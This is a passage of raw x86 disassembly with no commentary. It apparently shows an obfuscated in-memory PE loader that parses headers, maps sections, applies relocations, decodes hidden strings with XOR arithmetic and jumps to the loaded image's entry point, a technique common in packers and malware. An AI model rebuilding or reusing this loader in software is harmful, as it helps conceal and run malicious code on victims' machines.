  4277b8:	mov    eax,DWORD PTR [ebp-0x4]
  4277bb:	jne    0x4277c5
  4277bd:	mov    eax,DWORD PTR [ebp-0x8]
  4277c0:	jmp    0x4277c5
  4277c2:	mov    eax,DWORD PTR [ebp-0x4]
  4277c5:	xor    eax,esi
  4277c7:	add    eax,edi
  4277c9:	pop    edi
  4277ca:	pop    esi
  4277cb:	pop    ebx
  4277cc:	leave  
  4277cd:	ret    0xc
  4277d0:	push   ebp
  4277d1:	mov    ebp,esp
  4277d3:	sub    esp,0x28
  4277d6:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4277dd:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  4277e4:	mov    eax,DWORD PTR [ebp+0xc]
  4277e7:	mov    DWORD PTR [ebp+0xc],eax
  4277ea:	push   esi
  4277eb:	mov    eax,eax
  4277ed:	mov    eax,DWORD PTR [ebp-0x4]
  4277f0:	mov    esi,DWORD PTR [ebp+0x8]
  4277f3:	mov    ecx,0x75108ae
  4277f8:	xor    eax,ecx
  4277fa:	mov    edx,0x3272f5
  4277ff:	add    eax,edx
  427801:	cmp    esi,eax
  427803:	je     0x42792a
  427809:	mov    eax,DWORD PTR [ebp+0x8]
  42780c:	mov    esi,DWORD PTR [ebp+0x8]
  42780f:	add    esi,DWORD PTR [eax+0x3c]
  427812:	push   edi
  427813:	mov    DWORD PTR [ebp+0xc],esi
  427816:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42781d:	mov    eax,DWORD PTR [ebp-0x1c]
  427820:	mov    esi,DWORD PTR [ebp-0x4]
  427823:	mov    edi,DWORD PTR [ebp+0xc]
  427826:	xor    esi,ecx
  427828:	xor    eax,ecx
  42782a:	add    esi,edx
  42782c:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  427833:	je     0x427924
  427839:	mov    esi,DWORD PTR [ebp+0xc]
  42783c:	mov    eax,DWORD PTR [ebp+0x8]
  42783f:	add    eax,DWORD PTR [esi+0xa0]
  427845:	mov    esi,DWORD PTR [ebp+0x8]
  427848:	mov    edi,DWORD PTR [ebp+0xc]
  42784b:	sub    esi,DWORD PTR [edi+0x34]
  42784e:	mov    edi,DWORD PTR [ebp-0x4]
  427851:	xor    edi,ecx
  427853:	add    edi,edx
  427855:	mov    DWORD PTR [ebp-0x24],esi
  427858:	cmp    esi,edi
  42785a:	je     0x427924
  427860:	mov    esi,DWORD PTR [ebp-0x4]
  427863:	xor    esi,ecx
  427865:	add    esi,edx
  427867:	mov    DWORD PTR [ebp-0x8],esi
  42786a:	push   ebx
  42786b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427872:	jmp    0x42790e
  427877:	mov    esi,DWORD PTR [ebp-0x4]
  42787a:	xor    esi,ecx
  42787c:	lea    edi,[ebx-0x8]
  42787f:	add    esi,edx
  427881:	shr    edi,1
  427883:	cmp    esi,edi
  427885:	jae    0x4278f4
  427887:	sub    edi,esi
  427889:	lea    ebx,[eax+esi*2+0x8]
  42788d:	mov    DWORD PTR [ebp-0x18],edi
  427890:	movzx  esi,WORD PTR [ebx]
  427893:	and    esi,0xfff
  427899:	mov    DWORD PTR [ebp-0x14],esi
  42789c:	mov    edi,DWORD PTR [ebp-0x14]
  42789f:	mov    esi,DWORD PTR [eax]
  4278a1:	sub    esi,edx
  4278a3:	add    edi,esi
  4278a5:	movzx  esi,WORD PTR [ebx]
  4278a8:	shr    esi,0xc
  4278ab:	xor    edi,ecx
  4278ad:	mov    DWORD PTR [ebp-0x20],edi
  4278b0:	mov    DWORD PTR [ebp-0x14],esi
  4278b3:	mov    esi,DWORD PTR [ebp-0x20]
  4278b6:	mov    edi,DWORD PTR [ebp+0x8]
  4278b9:	xor    esi,ecx
  4278bb:	lea    esi,[esi+edi*1+0x3272f5]
  4278c2:	mov    DWORD PTR [ebp-0x20],esi
  4278c5:	mov    esi,DWORD PTR [ebp-0x10]
  4278c8:	mov    edi,DWORD PTR [ebp-0x14]
  4278cb:	xor    esi,ecx
  4278cd:	add    esi,edx
  4278cf:	cmp    edi,esi
  4278d1:	jne    0x4278e9
  4278d3:	mov    esi,DWORD PTR [ebp-0x10]
  4278d6:	mov    edi,DWORD PTR [ebp-0x14]
  4278d9:	xor    esi,ecx
  4278db:	add    esi,edx
  4278dd:	cmp    edi,esi
  4278df:	jne    0x4278e9
  4278e1:	mov    esi,DWORD PTR [ebp-0x20]
  4278e4:	mov    edi,DWORD PTR [ebp-0x24]
  4278e7:	add    DWORD PTR [esi],edi
  4278e9:	add    ebx,0x2
  4278ec:	dec    DWORD PTR [ebp-0x18]
  4278ef:	jne    0x427890
  4278f1:	mov    ebx,DWORD PTR [ebp-0xc]
  4278f4:	add    DWORD PTR [ebp-0x8],ebx
  4278f7:	mov    esi,DWORD PTR [ebp-0x1c]
  4278fa:	mov    edi,DWORD PTR [ebp-0x8]
  4278fd:	mov    ebx,DWORD PTR [ebp+0xc]
  427900:	xor    esi,ecx
  427902:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  427909:	jae    0x427923
  42790b:	add    eax,DWORD PTR [ebp-0xc]
  42790e:	mov    esi,DWORD PTR [ebp-0x4]
  427911:	mov    ebx,DWORD PTR [eax+0x4]
  427914:	xor    esi,ecx
  427916:	add    esi,edx
  427918:	mov    DWORD PTR [ebp-0xc],ebx
  42791b:	cmp    ebx,esi
  42791d:	jne    0x427877
  427923:	pop    ebx
  427924:	mov    eax,DWORD PTR [ebp-0x28]
  427927:	pop    edi
  427928:	jmp    0x42792d
  42792a:	mov    eax,DWORD PTR [ebp-0x4]
  42792d:	xor    eax,ecx
  42792f:	add    eax,edx
  427931:	pop    esi
  427932:	leave  
  427933:	ret    0x8
  427936:	push   ebp
  427937:	mov    ebp,esp
  427939:	sub    esp,0xd8
  42793f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427946:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  42794d:	mov    eax,DWORD PTR [ebp-0x4]
  427950:	push   ebx
  427951:	push   esi
  427952:	mov    esi,0x75108ae
  427957:	xor    eax,esi
  427959:	push   edi
  42795a:	mov    edi,0x3272f5
  42795f:	add    eax,edi
  427961:	mov    DWORD PTR [ebp-0x18],eax
  427964:	mov    eax,DWORD PTR [ebp-0x4]
  427967:	xor    eax,esi
  427969:	add    eax,edi
  42796b:	mov    DWORD PTR [ebp-0x8],eax
  42796e:	mov    ebx,DWORD PTR [ebp+0x20]
  427971:	mov    eax,DWORD PTR [ebp-0x1c]
  427974:	mov    ecx,DWORD PTR [ebp-0x1c]
  427977:	xor    eax,ecx
  427979:	mov    DWORD PTR [ebp-0x1c],eax
  42797c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427983:	mov    eax,DWORD PTR [ebp-0xc]
  427986:	mov    ecx,DWORD PTR [ebp-0xc]
  427989:	xor    eax,ecx
  42798b:	mov    DWORD PTR [ebp-0xc],eax
  42798e:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427995:	mov    eax,DWORD PTR [ebp-0x10]
  427998:	mov    ecx,DWORD PTR [ebp-0x10]
  42799b:	xor    eax,ecx
  42799d:	mov    DWORD PTR [ebp-0x10],eax
  4279a0:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  4279a7:	mov    eax,DWORD PTR [ebp-0x28]
  4279aa:	mov    ecx,DWORD PTR [ebp-0x28]
  4279ad:	xor    eax,ecx
  4279af:	mov    DWORD PTR [ebp-0x28],eax
  4279b2:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4279b9:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4279c0:	mov    eax,DWORD PTR [ebp+0x8]
  4279c3:	test   eax,eax
  4279c5:	je     0x427e4c
  4279cb:	mov    eax,DWORD PTR [ebp+0xc]
  4279ce:	test   eax,eax
  4279d0:	je     0x427e4c
  4279d6:	mov    eax,DWORD PTR [ebp+0x18]
  4279d9:	test   eax,eax
  4279db:	je     0x427e4c
  4279e1:	mov    eax,DWORD PTR [ebp+0x20]
  4279e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4279e7:	xor    eax,0x8ae
  4279ec:	add    eax,0x72f5
  4279f1:	cmp    WORD PTR [ecx],ax
  4279f4:	jne    0x427e4c
  4279fa:	mov    eax,DWORD PTR [ebp-0x4]
  4279fd:	xor    eax,esi
  4279ff:	add    eax,edi
  427a01:	mov    DWORD PTR [ebp-0x30],eax
  427a04:	mov    eax,DWORD PTR [ebp-0x4]
  427a07:	mov    ecx,DWORD PTR [ebp+0x8]
  427a0a:	mov    eax,DWORD PTR [ebp+0x8]
  427a0d:	add    eax,DWORD PTR [ecx+0x3c]
  427a10:	mov    DWORD PTR [ebp+0xc],eax
  427a13:	mov    eax,DWORD PTR [eax+0x50]
  427a16:	test   eax,eax
  427a18:	je     0x427e4c
  427a1e:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427a25:	mov    eax,DWORD PTR [ebp-0x2c]
  427a28:	xor    eax,esi
  427a2a:	add    eax,edi
  427a2c:	mov    DWORD PTR [ebp-0x2c],eax
  427a2f:	mov    eax,DWORD PTR [ebp-0x4]
  427a32:	mov    eax,DWORD PTR [ebx+0x190]
  427a38:	mov    ecx,DWORD PTR [eax]
  427a3a:	mov    ecx,DWORD PTR [ecx+0x3c]
  427a3d:	add    ecx,DWORD PTR [eax]
  427a3f:	mov    eax,DWORD PTR [ebp-0x4]
  427a42:	mov    eax,DWORD PTR [ebx+0x18c]
  427a48:	mov    edx,DWORD PTR [eax]
  427a4a:	mov    DWORD PTR [ebp-0x20],ecx
  427a4d:	mov    DWORD PTR [ebp+0x20],edx
  427a50:	cmp    edx,edx
  427a52:	jne    0x427a86
  427a54:	mov    eax,DWORD PTR [ebx+0x1e0]
  427a5a:	lea    edx,[ebp-0x18]
  427a5d:	push   edx
  427a5e:	mov    edx,DWORD PTR [ebp-0xc]
  427a61:	xor    edx,esi
  427a63:	add    edx,edi
  427a65:	push   edx
  427a66:	push   DWORD PTR [ecx+0x50]
  427a69:	push   DWORD PTR [ebp+0x20]
  427a6c:	call   DWORD PTR [eax+0x1c]
  427a6f:	mov    eax,DWORD PTR [ebp-0x20]
  427a72:	mov    ecx,DWORD PTR [eax+0x54]
  427a75:	mov    eax,DWORD PTR [eax+0x50]
  427a78:	sub    eax,ecx
  427a7a:	add    ecx,DWORD PTR [ebp+0x20]
  427a7d:	push   ecx
  427a7e:	call   0x4283e9
  427a83:	mov    edx,DWORD PTR [ebp+0x20]
  427a86:	mov    eax,DWORD PTR [ebx+0x194]
  427a8c:	mov    DWORD PTR [eax],edx
  427a8e:	mov    eax,DWORD PTR [ebp+0xc]
  427a91:	push   DWORD PTR [eax+0x54]
  427a94:	push   DWORD PTR [ebp+0x8]
  427a97:	push   edx
  427a98:	call   0x4282df
  427a9d:	mov    ecx,DWORD PTR [ebp+0x20]
  427aa0:	mov    eax,DWORD PTR [ecx+0x3c]
  427aa3:	add    eax,ecx
  427aa5:	movzx  ecx,WORD PTR [eax+0x14]
  427aa9:	lea    ecx,[ecx+eax*1+0x18]
  427aad:	mov    DWORD PTR [ebp+0x18],ecx
  427ab0:	mov    ecx,DWORD PTR [ebp-0x4]
  427ab3:	movzx  edx,WORD PTR [eax+0x6]
  427ab7:	xor    ecx,esi
  427ab9:	add    ecx,edi
  427abb:	mov    DWORD PTR [ebp+0xc],eax
  427abe:	cmp    edx,ecx
  427ac0:	je     0x427b6d
  427ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  427ac9:	xor    ecx,esi
  427acb:	add    ecx,edi
  427acd:	mov    DWORD PTR [ebp-0x8],ecx
  427ad0:	mov    ecx,DWORD PTR [ebp-0x24]
  427ad3:	movzx  edx,WORD PTR [eax+0x6]
  427ad7:	xor    ecx,esi
  427ad9:	sub    edx,ecx
  427adb:	sub    edx,edi
  427add:	cmp    DWORD PTR [ebp-0x8],edx
  427ae0:	ja     0x427b6d
  427ae6:	mov    edx,DWORD PTR [ebp+0x18]
  427ae9:	add    edx,0x8
  427aec:	mov    DWORD PTR [ebp+0x18],edx
  427aef:	jmp    0x427af4
  427af1:	mov    edx,DWORD PTR [ebp+0x18]
  427af4:	mov    eax,DWORD PTR [eax+0x38]
  427af7:	lea    ecx,[eax-0x1]
  427afa:	mov    DWORD PTR [ebp-0x38],eax
  427afd:	mov    eax,DWORD PTR [edx]
  427aff:	test   eax,ecx
  427b01:	je     0x427b0a
  427b03:	not    ecx
  427b05:	and    eax,ecx
  427b07:	add    eax,DWORD PTR [ebp-0x38]
  427b0a:	mov    ecx,DWORD PTR [edx+0x4]
  427b0d:	add    ecx,DWORD PTR [ebp+0x20]
  427b10:	push   ecx
  427b11:	call   0x4283e9
  427b16:	mov    edx,DWORD PTR [ebp-0x4]
  427b19:	mov    eax,DWORD PTR [ebp+0x18]
  427b1c:	mov    ecx,DWORD PTR [eax+0x8]
  427b1f:	xor    edx,esi
  427b21:	add    edx,edi
  427b23:	cmp    ecx,edx
  427b25:	je     0x427b3e
  427b27:	push   ecx
  427b28:	mov    ecx,DWORD PTR [ebp+0x8]
  427b2b:	add    ecx,DWORD PTR [eax+0xc]
  427b2e:	mov    eax,DWORD PTR [eax+0x4]
  427b31:	add    eax,DWORD PTR [ebp+0x20]
  427b34:	push   ecx
  427b35:	push   eax
  427b36:	call   0x4282df
  427b3b:	mov    eax,DWORD PTR [ebp+0x18]
  427b3e:	mov    ecx,DWORD PTR [ebp-0x24]
  427b41:	mov    edx,DWORD PTR [ebp-0x8]
  427b44:	add    eax,0x28
  427b47:	xor    ecx,esi
  427b49:	lea    ecx,[edx+ecx*1+0x3272f5]
  427b50:	mov    edx,DWORD PTR [ebp+0xc]
  427b53:	mov    DWORD PTR [ebp+0x18],eax
  427b56:	mov    eax,DWORD PTR [ebp-0x24]
  427b59:	movzx  edx,WORD PTR [edx+0x6]
  427b5d:	xor    eax,esi
  427b5f:	sub    edx,eax
  427b61:	mov    eax,DWORD PTR [ebp+0xc]
  427b64:	sub    edx,edi
  427b66:	mov    DWORD PTR [ebp-0x8],ecx
  427b69:	cmp    ecx,edx
  427b6b:	jbe    0x427af1
  427b6d:	mov    edx,DWORD PTR [ebx+0x18c]
  427b73:	mov    ecx,DWORD PTR [ebp+0x20]
  427b76:	cmp    ecx,DWORD PTR [edx]
  427b78:	jne    0x427ba1
  427b7a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427b80:	lea    edx,[ebp-0x18]
  427b83:	push   edx
  427b84:	mov    edx,DWORD PTR [ebp-0x10]
  427b87:	xor    edx,esi
  427b89:	add    edx,edi
  427b8b:	push   edx
  427b8c:	mov    edx,DWORD PTR [ebp-0x20]
  427b8f:	push   DWORD PTR [edx+0x54]
  427b92:	push   ecx
  427b93:	call   DWORD PTR [eax+0x1c]
  427b96:	test   eax,eax
  427b98:	je     0x427e3d
  427b9e:	mov    eax,DWORD PTR [ebp+0xc]
  427ba1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427ba7:	mov    ecx,DWORD PTR [ecx]
  427ba9:	xor    ecx,esi
  427bab:	add    ecx,edi
  427bad:	je     0x427d68
  427bb3:	mov    eax,DWORD PTR [ebp-0x4]
  427bb6:	xor    eax,esi
  427bb8:	add    eax,edi
  427bba:	and    DWORD PTR [ebp+0x8],0x0
  427bbe:	mov    DWORD PTR [ebp-0x14],eax
  427bc1:	mov    eax,0xf89c85c1
  427bc6:	lea    ecx,[eax+0x18]
  427bc9:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427bd0:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427bd7:	mov    DWORD PTR [ebp-0x50],eax
  427bda:	mov    DWORD PTR [ebp-0x4c],ecx
  427bdd:	mov    DWORD PTR [ebp-0x48],ecx
  427be0:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427be7:	mov    edx,DWORD PTR [ebp+0x8]
  427bea:	mov    ecx,0x8ae
  427bef:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427bf4:	mov    edx,0x72f5
  427bf9:	add    cx,dx
  427bfc:	mov    edx,DWORD PTR [ebp+0x8]
  427bff:	inc    DWORD PTR [ebp+0x8]
  427c02:	cmp    DWORD PTR [ebp+0x8],0x6
  427c06:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427c0e:	jb     0x427be7
  427c10:	mov    ecx,0xf89c85d3
  427c15:	mov    DWORD PTR [ebp-0xb0],eax
  427c1b:	mov    DWORD PTR [ebp-0x9c],eax
  427c21:	mov    DWORD PTR [ebp-0x74],eax
  427c24:	mov    DWORD PTR [ebp-0x70],eax
  427c27:	lea    eax,[ecx-0x3]
  427c2a:	lea    edx,[ecx+0x2c]
  427c2d:	mov    DWORD PTR [ebp-0x64],eax
  427c30:	mov    DWORD PTR [ebp-0x60],eax
  427c33:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427c3d:	mov    DWORD PTR [ebp-0xac],ecx
  427c43:	mov    DWORD PTR [ebp-0xa8],edx
  427c49:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427c53:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427c5d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427c67:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427c71:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427c7b:	mov    DWORD PTR [ebp-0x8c],ecx
  427c81:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427c8b:	mov    DWORD PTR [ebp-0x84],edx
  427c91:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427c98:	mov    DWORD PTR [ebp-0x7c],ecx
  427c9b:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427ca2:	mov    DWORD PTR [ebp-0x6c],ecx
  427ca5:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427cac:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427cb3:	xor    eax,eax
  427cb5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427cbc:	xor    cl,0xae
  427cbf:	sub    cl,0xb
  427cc2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427cc9:	inc    eax
  427cca:	cmp    eax,0x17
  427ccd:	jb     0x427cb5
  427ccf:	mov    eax,DWORD PTR [ebx+0x1e0]
  427cd5:	lea    ecx,[ebp-0xc0]
  427cdb:	push   ecx
  427cdc:	call   DWORD PTR [eax+0x4]
  427cdf:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427ce5:	lea    edx,[ebp-0xd8]
  427ceb:	push   edx
  427cec:	push   eax
  427ced:	call   DWORD PTR [ecx+0x8]
  427cf0:	mov    DWORD PTR [ebp-0x40],eax
  427cf3:	lea    eax,[ebp-0x14]
  427cf6:	push   eax
  427cf7:	mov    eax,DWORD PTR [ebx+0x18c]
  427cfd:	push   DWORD PTR [eax]
  427cff:	mov    eax,DWORD PTR [ebp-0x40]
  427d02:	call   eax
  427d04:	mov    eax,DWORD PTR [ebp-0x4]
  427d07:	xor    eax,esi
  427d09:	add    eax,edi
  427d0b:	mov    DWORD PTR [ebp-0x34],eax
  427d0e:	mov    ecx,DWORD PTR [ebp-0x4]
  427d11:	mov    eax,DWORD PTR [ebp-0x14]
  427d14:	xor    ecx,esi
  427d16:	add    ecx,edi
  427d18:	cmp    eax,ecx
  427d1a:	je     0x427d65
  427d1c:	mov    DWORD PTR [ebp-0x3c],eax
  427d1f:	jmp    0x427d30
  427d21:	mov    eax,DWORD PTR [eax]
  427d23:	mov    ecx,DWORD PTR [ebp-0x3c]
  427d26:	mov    DWORD PTR [ebp-0x14],eax
  427d29:	mov    eax,DWORD PTR [ebp-0x14]
  427d2c:	cmp    eax,ecx
  427d2e:	je     0x427d3d
  427d30:	mov    edx,DWORD PTR [eax+0x18]
  427d33:	mov    ecx,DWORD PTR [ebx+0x18c]
  427d39:	cmp    edx,DWORD PTR [ecx]
  427d3b:	jne    0x427d21
  427d3d:	mov    ecx,DWORD PTR [ebx+0x18c]
  427d43:	mov    edx,DWORD PTR [eax+0x18]
  427d46:	cmp    edx,DWORD PTR [ecx]
  427d48:	jne    0x427d65
  427d4a:	mov    ecx,DWORD PTR [ebx+0x190]
  427d50:	mov    edx,DWORD PTR [ebp-0x20]
  427d53:	mov    edx,DWORD PTR [edx+0x28]
  427d56:	add    edx,DWORD PTR [ecx]
  427d58:	mov    DWORD PTR [eax+0x1c],edx
  427d5b:	mov    eax,DWORD PTR [ebp-0x24]
  427d5e:	xor    eax,esi
  427d60:	add    eax,edi
  427d62:	mov    DWORD PTR [ebp-0x34],eax
  427d65:	mov    eax,DWORD PTR [ebp+0xc]
  427d68:	push   ebx
  427d69:	push   eax
  427d6a:	push   DWORD PTR [ebp+0x20]
  427d6d:	call   0x4274ed
  427d72:	test   eax,eax
  427d74:	je     0x427e3d
  427d7a:	push   DWORD PTR [ebp+0xc]
  427d7d:	mov    ecx,ebx
  427d7f:	push   DWORD PTR [ebp+0x20]
  427d82:	call   0x427446
  427d87:	test   eax,eax
  427d89:	je     0x427e3d
  427d8f:	mov    eax,DWORD PTR [ebp+0xc]
  427d92:	mov    edx,DWORD PTR [ebp+0x20]
  427d95:	mov    ecx,ebx
  427d97:	call   0x42731f
  427d9c:	test   eax,eax
  427d9e:	je     0x427e3d
  427da4:	push   ebx
  427da5:	push   DWORD PTR [ebp+0x20]
  427da8:	call   0x4277d0
  427dad:	test   eax,eax
  427daf:	je     0x427e3d
  427db5:	mov    eax,DWORD PTR [ebx+0x18c]
  427dbb:	mov    edx,DWORD PTR [ebp+0x20]
  427dbe:	cmp    edx,DWORD PTR [eax]
  427dc0:	jne    0x427ddc
  427dc2:	mov    eax,DWORD PTR [ebx+0x1e0]
  427dc8:	lea    ecx,[ebp-0x18]
  427dcb:	push   ecx
  427dcc:	push   DWORD PTR [ebp-0x18]
  427dcf:	mov    ecx,DWORD PTR [ebp-0x20]
  427dd2:	push   DWORD PTR [ecx+0x54]
  427dd5:	push   edx
  427dd6:	call   DWORD PTR [eax+0x1c]
  427dd9:	mov    edx,DWORD PTR [ebp+0x20]
  427ddc:	mov    eax,DWORD PTR [ebx+0x1c8]
  427de2:	mov    eax,DWORD PTR [eax]
  427de4:	xor    eax,esi
  427de6:	add    eax,edi
  427de8:	je     0x427e21
  427dea:	mov    ecx,DWORD PTR [ebp+0xc]
  427ded:	mov    eax,DWORD PTR [ecx+0x28]
  427df0:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427df7:	mov    esi,DWORD PTR [ebp+0x8]
  427dfa:	push   DWORD PTR [ebp+0x14]
  427dfd:	xor    esi,0x8ae
  427e03:	push   DWORD PTR [ebp+0x10]
  427e06:	add    esi,0x72f5
  427e0c:	or     WORD PTR [ecx+0x16],si
  427e10:	add    eax,edx
  427e12:	push   edx
  427e13:	call   eax
  427e15:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427e1f:	jmp    0x427e2b
  427e21:	mov    eax,DWORD PTR [ebp+0xc]
  427e24:	mov    eax,DWORD PTR [eax+0x28]
  427e27:	add    eax,edx
  427e29:	call   eax
  427e2b:	mov    DWORD PTR [ebp-0x8],eax
  427e2e:	mov    eax,DWORD PTR [ebp-0x8]
  427e31:	mov    ecx,DWORD PTR [ebp+0x1c]
  427e34:	mov    DWORD PTR [ecx],eax
  427e36:	mov    DWORD PTR [ebp-0x30],0x1
  427e3d:	cmp    DWORD PTR [ebp-0x30],0x0
  427e41:	jne    0x427e47
  427e43:	and    DWORD PTR [ebp+0x20],0x0
  427e47:	mov    eax,DWORD PTR [ebp+0x20]
  427e4a:	jmp    0x427e4e
  427e4c:	xor    eax,eax
  427e4e:	pop    edi
  427e4f:	pop    esi
  427e50:	pop    ebx
  427e51:	leave  
  427e52:	ret    0x1c
  427e55:	push   ebp
  427e56:	mov    ebp,esp
  427e58:	movzx  edx,WORD PTR [ecx+0x6]
  427e5c:	movzx  eax,WORD PTR [ecx+0x14]
  427e60:	push   ebx
  427e61:	push   edi
  427e62:	xor    edi,edi
  427e64:	lea    eax,[eax+ecx*1+0x18]
  427e68:	test   edx,edx
  427e6a:	je     0x427e8b
  427e6c:	mov    ecx,DWORD PTR [eax+0xc]
  427e6f:	lea    ebx,[ecx+esi*1]
  427e72:	cmp    DWORD PTR [ebp+0x8],ebx
  427e75:	jb     0x427e83
  427e77:	mov    ebx,DWORD PTR [eax+0x8]
  427e7a:	add    ebx,ecx
  427e7c:	add    ebx,esi
  427e7e:	cmp    DWORD PTR [ebp+0x8],ebx
  427e81:	jb     0x427e8d
  427e83:	add    eax,0x28
  427e86:	inc    edi
  427e87:	cmp    edi,edx
  427e89:	jb     0x427e6c
  427e8b:	xor    eax,eax
  427e8d:	pop    edi
  427e8e:	pop    ebx
  427e8f:	pop    ebp
  427e90:	ret    0x4
  427e93:	push   ebp
  427e94:	mov    ebp,esp
  427e96:	sub    esp,0x34
  427e99:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427ea0:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427ea7:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427eae:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427eb5:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427ebc:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427ec3:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427eca:	mov    DWORD PTR [ebp-0x10],eax
  427ecd:	mov    eax,DWORD PTR [ebp+0x8]
  427ed0:	mov    DWORD PTR [ebp-0x14],eax
  427ed3:	mov    eax,DWORD PTR [ebp-0xc]
  427ed6:	push   ebx
  427ed7:	mov    ecx,0x75108ae
  427edc:	xor    eax,ecx
  427ede:	push   esi
  427edf:	mov    esi,DWORD PTR [ebp-0x10]
  427ee2:	mov    edx,0x3272f5
  427ee7:	add    eax,edx
  427ee9:	push   edi
  427eea:	cmp    esi,eax
  427eec:	je     0x4280cb
  427ef2:	mov    eax,DWORD PTR [ebp-0xc]
  427ef5:	mov    esi,DWORD PTR [ebp-0x14]
  427ef8:	xor    eax,ecx
  427efa:	add    eax,edx
  427efc:	cmp    esi,eax
  427efe:	je     0x4280cb
  427f04:	mov    eax,DWORD PTR [ebp-0xc]
  427f07:	xor    eax,ecx
  427f09:	add    eax,edx
  427f0b:	mov    DWORD PTR [ebp-0x24],eax
  427f0e:	mov    eax,DWORD PTR [ebp-0xc]
  427f11:	xor    eax,ecx
  427f13:	add    eax,edx
  427f15:	mov    DWORD PTR [ebp-0x28],eax
  427f18:	mov    edi,DWORD PTR [ebp-0x20]
  427f1b:	mov    ebx,DWORD PTR [ebp-0x8]
  427f1e:	mov    esi,0x8ae
  427f23:	xor    edi,esi
  427f25:	mov    eax,0x72f5
  427f2a:	xor    ebx,esi
  427f2c:	add    edi,eax
  427f2e:	add    ebx,eax
  427f30:	sub    ebx,edi
  427f32:	mov    WORD PTR [ebp-0x8],bx
  427f36:	jmp    0x427ffb
  427f3b:	mov    edi,DWORD PTR [ebp-0xc]
  427f3e:	mov    bx,WORD PTR [ebp-0x4]
  427f42:	xor    edi,esi
  427f44:	add    edi,eax
  427f46:	cmp    bx,di
  427f49:	je     0x42803d
  427f4f:	mov    edi,DWORD PTR [ebp-0xc]
  427f52:	mov    ebx,DWORD PTR [ebp+0xc]
  427f55:	xor    edi,ecx
  427f57:	add    edi,edx
  427f59:	cmp    ebx,edi
  427f5b:	mov    di,WORD PTR [ebp-0x4]
  427f5f:	mov    bx,WORD PTR [ebp+0x8]
  427f63:	je     0x427fce
  427f65:	cmp    bx,di
  427f68:	je     0x427fd7
  427f6a:	mov    edi,DWORD PTR [ebp-0x20]
  427f6d:	mov    bx,WORD PTR [ebp+0x8]
  427f71:	xor    edi,esi
  427f73:	add    edi,eax
  427f75:	cmp    bx,di
  427f78:	jb     0x427f98
  427f7a:	mov    edi,DWORD PTR [ebp-0x2c]
  427f7d:	mov    bx,WORD PTR [ebp+0x8]
  427f81:	xor    edi,esi
  427f83:	add    edi,eax
  427f85:	cmp    bx,di
  427f88:	ja     0x427f98
  427f8a:	movzx  edi,WORD PTR [ebp+0x8]
  427f8e:	movzx  ebx,WORD PTR [ebp-0x8]
  427f92:	add    edi,ebx
  427f94:	mov    WORD PTR [ebp+0x8],di
  427f98:	mov    edi,DWORD PTR [ebp-0x20]
  427f9b:	mov    bx,WORD PTR [ebp-0x4]
  427f9f:	xor    edi,esi
  427fa1:	add    edi,eax
  427fa3:	cmp    bx,di
  427fa6:	jb     0x427fc6
  427fa8:	mov    edi,DWORD PTR [ebp-0x2c]
  427fab:	mov    bx,WORD PTR [ebp-0x4]
  427faf:	xor    edi,esi
  427fb1:	add    edi,eax
  427fb3:	cmp    bx,di
  427fb6:	ja     0x427fc6
  427fb8:	movzx  edi,WORD PTR [ebp-0x4]
  427fbc:	movzx  ebx,WORD PTR [ebp-0x8]
  427fc0:	add    edi,ebx
  427fc2:	mov    WORD PTR [ebp-0x4],di
  427fc6:	mov    di,WORD PTR [ebp-0x4]
  427fca:	mov    bx,WORD PTR [ebp+0x8]
  427fce:	cmp    bx,di
  427fd1:	jne    0x4280cb
  427fd7:	mov    edi,DWORD PTR [ebp-0x1c]
  427fda:	mov    ebx,DWORD PTR [ebp-0x10]
  427fdd:	xor    edi,ecx
  427fdf:	lea    edi,[edi+ebx*1+0x3272f5]
  427fe6:	mov    DWORD PTR [ebp-0x10],edi
  427fe9:	mov    edi,DWORD PTR [ebp-0x1c]
  427fec:	mov    ebx,DWORD PTR [ebp-0x14]
  427fef:	xor    edi,ecx
  427ff1:	lea    edi,[edi+ebx*1+0x3272f5]
  427ff8:	mov    DWORD PTR [ebp-0x14],edi
